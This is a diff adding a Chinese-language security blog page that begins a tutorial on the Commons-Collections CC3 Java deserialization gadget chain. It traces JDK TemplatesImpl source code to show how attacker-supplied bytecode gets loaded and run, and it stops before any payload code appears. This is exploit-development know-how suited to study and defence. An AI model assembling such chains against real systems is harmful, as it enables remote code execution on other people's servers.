@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"sunian19.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="前言 原本的 CC1 链与 CC6 链是通过 Runtime.exec() 进行命令执行的。 而CC3 链这条链子，是使用 类加载机制 来执行恶意代码的。 可以理解为cc1 cc6是命令执行；而cc3是代码执行。 环境  jdk8u65 Commons-Collections 3.2.1  TemplatesImpl解析 前提知识：利用 ClassLoader#defineClass 直接加载字节">
+<meta property="og:type" content="article">
+<meta property="og:title" content="&#39;Java反序列化-cc3&#39;">
+<meta property="og:url" content="https://sunian19.github.io/2022/10/26/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3/index.html">
+<meta property="og:site_name" content="zer0_c|imb&#39;s blog">
+<meta property="og:description" content="前言 原本的 CC1 链与 CC6 链是通过 Runtime.exec() 进行命令执行的。 而CC3 链这条链子，是使用 类加载机制 来执行恶意代码的。 可以理解为cc1 cc6是命令执行；而cc3是代码执行。 环境  jdk8u65 Commons-Collections 3.2.1  TemplatesImpl解析 前提知识：利用 ClassLoader#defineClass 直接加载字节">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java133.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java134.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java135.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java139.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java140.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java141.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java142.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java143.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java144.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java145.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java146.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java147.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java148.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java149.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java150.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java151.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java152.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java153.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java154.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java155.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java157.png">
+<meta property="article:published_time" content="2022-10-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-11-01T06:54:39.993Z">
+<meta property="article:author" content="zer0_c|imb">
+<meta property="article:tag" content="java安全系列">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sunian19.github.io/imgss/java133.png">
+
+
+<link rel="canonical" href="https://sunian19.github.io/2022/10/26/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://sunian19.github.io/2022/10/26/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3/","path":"2022/10/26/java反序列化-cc3/","title":"'Java反序列化-cc3'"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>'Java反序列化-cc3' | zer0_c|imb's blog</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?48584c486973b4bf025a425c3d7b4007"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">zer0_c|imb's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#qian-yan"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#huan-jing"><span class="nav-number">2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#templates-impl-jie-xi"><span class="nav-number">3.</span> <span class="nav-text">TemplatesImpl解析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#diao-shi-bu-fen"><span class="nav-number">3.1.</span> <span class="nav-text">调试部分：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#templates-impl-li-yong"><span class="nav-number">4.</span> <span class="nav-text">TemplatesImpl利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#jie-jue-if"><span class="nav-number">4.1.</span> <span class="nav-text">解决if</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cc-1-lian-de-templates-impl-de-shi-xian-fang-shi"><span class="nav-number">5.</span> <span class="nav-text">CC1 链的 TemplatesImpl 的实现方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cc-6-lian-de-templates-impl-de-shi-xian-fang-shi"><span class="nav-number">6.</span> <span class="nav-text">CC6 链的 TemplatesImpl 的实现方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#yso-de-lian-zi"><span class="nav-number">7.</span> <span class="nav-text">yso的链子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cc-1-lian-zuo-wei-qian-ban-bu-fen"><span class="nav-number">7.1.</span> <span class="nav-text">CC1 链作为前半部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cc-6-lian-zuo-wei-qian-ban-bu-fen"><span class="nav-number">7.2.</span> <span class="nav-text">CC6 链作为前半部分</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xiao-jie-liu-cheng-tu"><span class="nav-number">8.</span> <span class="nav-text">小结(流程图)</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zer0_c|imb"
+      src="/imgss/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">zer0_c|imb</p>
+  <div class="site-description" itemprop="description">忘川河畔彼岸花，红如鲜血似朱砂</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:lingyu195@gmail.com" title="E-Mail → mailto:lingyu195@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3504078815" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;3504078815" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.ch4ser.top/" title="http:&#x2F;&#x2F;www.ch4ser.top&#x2F;" rel="noopener" target="_blank">ch4ser</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://hackergu.com/" title="http:&#x2F;&#x2F;hackergu.com&#x2F;" rel="noopener" target="_blank">Gu</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://al0neranger.github.io/" title="https:&#x2F;&#x2F;al0neranger.github.io&#x2F;" rel="noopener" target="_blank">al0neranger</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/lyshark" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;lyshark" rel="noopener" target="_blank">lyshark</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunian19.github.io/2022/10/26/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/imgss/touxiang.jpg">
+      <meta itemprop="name" content="zer0_c|imb">
+      <meta itemprop="description" content="忘川河畔彼岸花，红如鲜血似朱砂">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zer0_c|imb's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          'Java反序列化-cc3'
+        </h1>
+
+
+        <div class="post-meta">
+        
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-10-26 00:00:00" itemprop="dateCreated datePublished" datetime="2022-10-26T00:00:00+08:00">2022-10-26</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-11-01 14:54:39" itemprop="dateModified" datetime="2022-11-01T14:54:39+08:00">2022-11-01</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">java安全系列</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="qian-yan" id="前言">前言</h3>
+<p>原本的 CC1 链与 CC6 链是通过 Runtime.exec() 进行命令执行的。<br>
+而CC3 链这条链子，是使用 <strong>类加载机制</strong> 来执行恶意代码的。<br>
+可以理解为cc1 cc6是命令执行；而cc3是代码执行。</p>
+<h3 id="huan-jing" id="环境">环境</h3>
+<ul>
+<li>jdk8u65</li>
+<li>Commons-Collections 3.2.1</li>
+</ul>
+<h3 id="templates-impl-jie-xi" id="TemplatesImpl解析">TemplatesImpl解析</h3>
+<p>前提知识：利用 ClassLoader#defineClass 直接加载字节码。<br>
+忘记的了同学，可以去看，java反序列化-基础中的 <strong>类加载流程(调试)</strong> 部分。</p>
+<blockquote>
+<p>ClassLoader.loadClass() --&gt; ClassLoader.findClass() --&gt; ClassLoader.defineClass()</p>
+</blockquote>
+<a id="more"></a>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>可以看到defineclass方法为protected，所以我们需要找到重写它为public的地方，才能调用此方法。</p>
+<h4 id="diao-shi-bu-fen" id="调试部分：">调试部分：</h4>
+<p>直接find usages找<code> defineClass(</code><br>
+找到TemplatesImpl类的defineClass方法。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这里的 defineClass() 方法没有标注作用域，默认为 defalut，也就是说自己的类里面可以调用，我们继续 find usages</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+<p>最终找到它在自己的defineTransletClasses方法下，调用了defineClass方法。</p>
+<p><img src="/imgss/java133.png" alt=""></p>
+<p>因为作用域是 private，所以我们看一看谁调用了 defineTransletClasses() 方法<br>
+然后找到getTransletInstance方法调用了defineTransletClasses方法，并且代码中使用newInstance方法进行实例化。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            <span class="comment">//_class 获取类，_transletIndex下标，</span></span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">            translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+<p>getTransletInstance函数还是私有的，所以继续找。<br>
+找到了newTransformer方法，并且还是public。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h3 id="templates-impl-li-yong" id="TemplatesImpl利用">TemplatesImpl利用</h3>
+<p>当前小链：TemplatesImpl.newTransformer() --&gt; defindclass --&gt;newInstance。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title">Templates</span>, <span class="title">Serializable</span> </span>&#123;</span><br></pre></td></tr></table></figure></div>
+<p>在分析过程我们说到只要走过 getTransletInstance() 方法即可，因为这个方法内调用了 newInstance() 方法，用伪代码来表示的话如下。</p>
